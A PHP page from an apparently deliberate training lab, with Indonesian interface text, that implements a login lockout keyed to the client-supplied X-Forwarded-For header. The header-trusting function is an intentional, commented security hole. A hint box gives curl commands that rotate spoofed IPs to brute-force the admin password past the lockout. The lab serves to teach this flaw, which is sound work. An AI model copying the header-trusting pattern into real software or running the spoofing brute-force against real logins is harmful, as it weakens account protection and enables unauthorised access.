<?php
$title = 'Lab 2: IP Lockout Bypass lewat X-Forwarded-For';
require_once __DIR__ . '/lib.php';
$db = load_db();

function effective_ip() {
    // VULNERABLE: blindly trusts a client-supplied header to determine the
    // "real" client IP for rate limiting, instead of only trusting
    // REMOTE_ADDR (or an X-Forwarded-For value added by a TRUSTED proxy
    // that the app operator controls).
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($parts[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = effective_ip();
    $count = $db['attempts_by_ip'][$ip] ?? 0;
    if ($count >= 3) {
        $msg = "IP $ip diblokir sementara karena terlalu banyak percobaan gagal.";
    } else {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        if (check_login($username, $password)) {
            $db['attempts_by_ip'][$ip] = 0;
            save_db($db);
            $msg = 'Login berhasil!';
        } else {
            $db['attempts_by_ip'][$ip] = $count + 1;
            save_db($db);
            $msg = "Login gagal dari IP $ip (percobaan ke-" . ($count + 1) . "/3).";
        }
    }
}
include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: setelah 3x gagal dari "IP" yang sama, IP itu diblokir. Server menentukan
IP dari header <code>X-Forwarded-For</code> kalau ada (mensimulasikan aplikasi di belakang
reverse proxy yang salah konfigurasi, mempercayai header ini apa adanya alih-alih memasangnya
sendiri berdasarkan koneksi TCP asli). Karena header ini <strong>sepenuhnya dikendalikan
pengirim request</strong>, kirim tiap percobaan password dengan nilai <code>X-Forwarded-For</code>
yang berbeda-beda supaya tidak pernah kena limit 3x untuk "IP" yang sama:</p>
<pre>curl -X POST -H "X-Forwarded-For: 1.1.1.1" -d "username=admin&password=123456" http://target/lab2_xff_bypass.php
curl -X POST -H "X-Forwarded-For: 2.2.2.2" -d "username=admin&password=password" http://target/lab2_xff_bypass.php
curl -X POST -H "X-Forwarded-For: 3.3.3.3" -d "username=admin&password=Passw0rd!" http://target/lab2_xff_bypass.php
# ...ulangi dengan IP palsu baru untuk tiap kandidat password</pre>
</details>

<p>IP efektif kamu saat ini (dari sudut pandang server): <code><?php echo htmlspecialchars(effective_ip()); ?></code></p>
<p>Percobaan gagal tercatat untuk IP ini: <?php echo (int)($db['attempts_by_ip'][effective_ip()] ?? 0); ?>/3</p>

<form method="post">
  <label>Username</label><br>
  <input type="text" name="username" value="admin"><br>
  <label>Password</label><br>
  <input type="text" name="password"><br>
  <button type="submit">Login</button>
</form>
<?php if ($msg): ?><div class="<?php echo strpos($msg,'berhasil')!==false ? 'result-box' : 'error-box'; ?>"><?php echo htmlspecialchars($msg); ?></div><?php endif; ?>

<?php include 'footer.php'; ?>
